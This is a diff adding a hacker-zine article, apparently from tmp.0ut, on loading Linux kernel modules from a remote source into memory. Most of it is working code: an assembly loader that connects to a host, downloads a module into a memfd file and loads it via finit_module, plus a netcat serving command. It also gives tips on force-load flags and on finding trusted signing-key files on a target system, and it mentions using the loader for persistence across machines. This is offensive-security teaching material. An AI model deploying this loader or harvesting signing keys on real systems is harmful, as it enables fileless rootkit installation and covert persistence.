@@ -1,0 +1,315 @@
+<html>
+<head>
+<title>tmp.0ut</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #FEFEFE;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+@font-face { font-family: "gohu"; src: url("gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 14px; line-height: 1.0; }
+         a { color: #93ffd7; text-decoration: none; }
+</style>
+</head>
+<body>
+<center><div style="display: inline-block; text-align: left;"><pre>
+                                                       ┌───────────────────────┐
+                                                       ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                       │ █   █ █ █ █   █       │
+                                                       │ █   █ █ █ █▀▀▀▀       │
+                                                       │ █   █   █ █     ▄     │
+                                                       │                 ▄▄▄▄▄ │
+                                                       │                 █   █ │
+                                                       │                 █   █ │
+                                                       │                 █▄▄▄█ │
+                                                       │                 ▄   ▄ │
+                                                       │                 █   █ │
+                                                       │                 █   █ │
+                                                       │                 █▄▄▄█ │
+                                                       │                 ▄▄▄▄▄ │
+                                                       │                   █   │
+In-Memory Kernel Module Loading                        │                   █   │
+~ netspooky                                            └───────────────────█ ──┘
+
+Since some changes to the Linux kernel in the past year have destroyed the old
+methodology of x86_64 binary golf, I figured it'd be fun to briefly touch on a
+technique for loading kernel modules from remote sources. We will discuss two 
+useful syscalls for your LKM loader, as well as some things to consider when
+using this approach.
+
+───[ Building A Test Module ]───────────────────────────────────────────────────
+
+We will start by building a simple kernel module to test with. All it will do is
+print a message to the kernel ring buffer (view with the `dmesg` command).
+
+    // bang.c
+    #include &lt;linux/module.h&gt;
+    #include &lt;linux/init.h&gt;
+    
+    MODULE_LICENSE("GPL");
+    
+    static int __init he(void) {
+        printk(KERN_INFO"we out here :}\n");
+        return 0;
+    }
+    
+    static void __exit le(void) {
+        printk(KERN_INFO"we are no longer out here :{\n");
+    }
+    
+    module_init(he);
+    module_exit(le);
+
+A simple Makefile to build it:
+
+    obj-m += bang.o
+    dir = $(shell uname -rm | sed -e 's/\s/\-/')
+    
+    all:
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+    
+    strip: all
+        strip bang.ko
+        mkdir -p $(dir)
+        cp -v bang.ko $(dir)/he.ko
+    
+    load: all
+        sudo insmod bang.ko
+    
+    unload:
+        sudo rmmod bang
+    
+    clean:
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+
+To build, just run `make`.
+
+Serve on port 42000 with `cat bang.ko | nc -k -lvp 42000`
+
+───[ The Loader ]───────────────────────────────────────────────────────────────
+
+The loader we will be using is fairly straight forward, but I will go over it in
+detail for those who are learning these techniques for further development.
+
+We are going to download this module into an in memory file. So we will start 
+by first creating a socket to our server (127.0.0.1:42000) that hosts the kernel
+module. We will then create a memfd file to download to the target.
+
+The memfd_create syscall was created as a method to have temporary files that 
+aren't associated with any file system. They are a convenient way to write to a
+file that only exists for the life of your program, and gives you the benefit of
+having both a temporary path, and a file descriptor.
+
+See an example of executing a memfd file from /proc/self/fd/4 here:
+  https://github.com/netspooky/golfclub/blob/master/linux/dl_memfd_219.asm#L100
+
+Once we've got our memfd file set up, we read the socket buffer from the remote
+host, and write it to our file descriptor.
+
+After the file has been downloaded to our memfd file, we use the finit_module 
+syscall to load a kernel module via a file descriptor.
+
+───[ kl.asm ]───────────────────────────────────────────────────────────────────
+
+;-- Download a kernel module from 127.0.0.1:42000 to memory and load -------//--
+;  __  __ .   __  __  __  __ .  .  . setup:
+; |  ||__||_ |__ |__||  ||  ||_/|  |   $ cat somekernelmodule.ko | nc -lvp 42000
+; |  ||   |     ||   |o ||o ||\ |__| build:
+; |  ||__ |__ __||   |__||__|| \ __|   $ nasm -f elf64 kl.asm ; ld kl.o -o kl
+;-------------------------------------------------------------------------------
+section .text
+global _start
+_start:
+; socket -----------------------------------------------------------------------
+; Setting up the socket
+; int socket(int domain, int type, int protocol);
+;  rdi = int domain
+;  rsi = int type
+;  rdx = int protocol 
+;-------------------------------------------------------------------------------
+  push byte 0x29               ; Push socket syscall number
+  pop rax                      ; RAX = socket syscall
+  push byte 0x2                ; Push domain: AF_INET
+  pop rdi                      ; RDI = AF_INET
+  push byte 0x1                ; Push type: SOCK_STREAM
+  pop rsi                      ; RSI = SOCK_STREAM
+  cdq                          ; RDX = 0
+  syscall                      ; socket syscall
+; connect ----------------------------------------------------------------------
+; We connect to our host to grab the file buffer
+; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+;  rdi = int sockfd
+;  rsi = const struct sockaddr *addr
+;  rdx = socklen_t addrlen
+;-------------------------------------------------------------------------------
+  xchg rdi, rax                ; int sockfd
+  mov rbx, rdi                 ; Save sockfd in rbx too for later
+  mov dword [rsp-4], 0x100007F ; Our IP   = 127.0.0.1
+  mov word  [rsp-6], 0x10A4    ; Our Port = 42000
+  mov byte  [rsp-8], 0x02      ; sockfd
+  sub rsp, 8                   ; Line up
+  push byte 0x2a               ; Push connect syscall number
+  pop rax                      ; RAX = connect syscall
+  mov rsi, rsp                 ; const struct sockaddr *addr
+  push byte 0x10               ; length
+  pop rdx                      ; length -&gt; rdx
+  syscall                      ; Execute the connect syscall
+; memfd_create -----------------------------------------------------------------
+; We are creating a virtual file to save our socket buffer to.
+; int memfd_create(const char *name, unsigned int flags);
+;  rdi = const char *pathname
+;  rsi = int flags
+;-------------------------------------------------------------------------------
+  mov ax, 0x13f                ; The syscall
+  push 0x474e4142              ; Filename BANG (GNAB here)
+  mov rdi, rsp                 ; Arg0: The file name
+  xor rsi, rsi                 ; int flags
+  syscall                      ; Execute memfd_create syscall
+; read -------------------------------------------------------------------------
+; We are reading the socket buffer to a buffer to save to local file
+; ssize_t read(socket sockfd,buf,len)
+;  rdi = int fd  
+;  rsi = void *buf 
+;  rdx = size_t count     
+;-------------------------------------------------------------------------------
+  mov r9, rax                  ; Save the local file descriptor
+  mov rdx, 0x400               ; size_t count = 1024 bytes 
+rwloop:
+  mov rdi, rbx                 ; Move sockFD to RDI
+  xor rax, rax                 ; 0 is read sycall
+  lea rsi, [rsp-1024]          ; buffer to hold output - arg1 *buf
+  syscall                      ; Read syscall
+; write ------------------------------------------------------------------------
+; We are writing the socket buffer to our local file
+; ssize_t sys_write(fd,*buf,count)
+;  rdi = int fd  
+;  rsi = const *buf 
+;  rdx = size_t count     
+;-------------------------------------------------------------------------------
+  mov rdi, r9                  ; Copy the file descriptor from our local file
+  mov rdx, rax                 ; RDX = # of bytes read, 0 means end of file
+  xor rax, rax                 ; RAX = 0
+  mov al, 1                    ; Syscall number
+  syscall                      ; Write syscall
+  cmp dx, 0x400                ; Check if there are still bytes left to read
+  je rwloop                    ; Loop if so
+; finit_module -----------------------------------------------------------------
+; Load the kernel module via a file descriptor
+; int finit_module(int fd, const char *param_values, int flags);
+;  rdi = int fd - The file descriptor
+;  rsi = const char *param_values
+;  rdx = int flags
+;-------------------------------------------------------------------------------
+  xor rax, rax                 ; RAX = 0
+  push rax                     ; param_values
+  mov rsi, rsp                 ; RSI = *param_values
+  mov rax, 0x139               ; finit_module syscall
+  mov rdi, r9                  ; int fd
+  xor rdx, rdx                 ; int flags 
+  syscall                      ; finit_module syscall
+;--- Exit ----------------------------------------------------------------------
+; void exit(int status);
+;  rdi = int status
+;-------------------------------------------------------------------------------
+  mov rax, 0x3c                ; Exit Syscall
+  mov rdi, 0x45                ; Return 69 for integrity check
+  syscall                      ; Peace out
+
+───[ finit_module flags ]───────────────────────────────────────────────────────
+
+The finit_module syscall is an interesting way to load a kernel module in Linux.
+Normally, the init_module syscall will load a module from a pointer in memory.
+The finit_module syscall loads a kernel module from a file descriptor, and also 
+has some unique ways to override the normal checks done before loading a module
+image. NOTE: finit_module flags are only usable if the target kernel is built to
+allow force loading. (See next section for details)
+
+The flags to override are defined in include/uapi/linux/module.h, and are OR'd
+and passed in the syscall in RDX.
+
+    /* Flags for sys_finit_module: */
+    #define MODULE_INIT_IGNORE_MODVERSIONS  1
+    #define MODULE_INIT_IGNORE_VERMAGIC     2
+
+The MODULE_INIT_IGNORE_MODVERSIONS flag ignores the symbol version hashes, and
+the MODULE_INIT_IGNORE_VERMAGIC flag ignores the kernel version magic value in
+the module. These both can be used to force the module into the kernel when
+they otherwise would be rejected. This can cause some undefined behavior and
+break the kernel, so use these flags with caution!
+
+finit_module describes this functionality as:
+
+  ..useful when the authenticity of a kernel module can be determined from its
+  location in the filesystem; in cases where that is possible, the overhead of
+  using cryptographically signed modules to determine the authenticity of a
+  module can be avoided. 
+
+  - man 2 finit_module
+
+───[ Determining Compatibility ]────────────────────────────────────────────────
+
+The tricky part about loading kernel modules in general is that there are many
+different configurations that can allow or disallow certain types of modules, or
+ways of loading them into the kernel. These are some of the kernel config flags
+you should know about before trying to load your module.
+
+::: CONFIG_MODVERSIONS :::
+
+If this is set, (eg CONFIG_MODVERSIONS=y), then you should be able to load 
+kernel modules compiled for different kernels.
+
+Check: 
+
+  $ grep CONFIG_MODVERSIONS /boot/config-YOURKERNELVERSION
+  CONFIG_MODVERSIONS=y
+
+More Info: https://cateee.net/lkddb/web-lkddb/MODVERSIONS.html
+
+::: CONFIG_MODULE_SIG_FORCE :::
+
+If this is set, then you won't be able to load unsigned modules.
+
+Check:
+
+  $ grep CONFIG_MODULE_SIG_FORCE /boot/config-YOURKERNELVERSION
+  # CONFIG_MODULE_SIG_FORCE is not set
+
+More Info: https://cateee.net/lkddb/web-lkddb/MODULE_SIG_FORCE.html
+
+PROTIP: You can enumerate the system for prexisting trusted keys that may be 
+there depending on the system you are targeting.
+
+Examples
+
+  /var/lib/shim-signed/mok/MOK.priv & /var/lib/shim-signed/mok/MOK.der 
+  /usr/src/LINUX/certs/signing_key.pem & /usr/src/LINUX/certs/signing_key.x509
+
+::: CONFIG_MODULE_FORCE_LOAD :::
+
+If this is set, this allows loading modules without version information. This
+should be set if attempting to use the finit_module flags. If it is not set and
+you use the flags to override, it'll fail with ENOEXEC.
+
+Check: 
+
+  $ grep CONFIG_MODULE_FORCE_LOAD /boot/config-YOURKERNELVERSION
+  # CONFIG_MODULE_FORCE_LOAD is not set
+
+More info: https://cateee.net/lkddb/web-lkddb/MODULE_FORCE_LOAD.html
+
+───[ .fini ]────────────────────────────────────────────────────────────────────
+
+We were using this technique when golfing kernel modules and testing the loader.
+It was also used during WRCCDC in the form of a one-liner that was helpful in
+establishing ad hoc persistence across many machines of the same configuration.
+
+This is just one of the many ways to load a kernel module. There's a lot to 
+explore, and I hope this inspires you to play around! 
+
+Shout out to everyone in: tmp.0ut, thugcrowd, vxug, tcpd
+
+PS. Look for a new ELF Binary Mangling article in the coming issues of tmp.0ut!
+</pre></div></center></body></html>
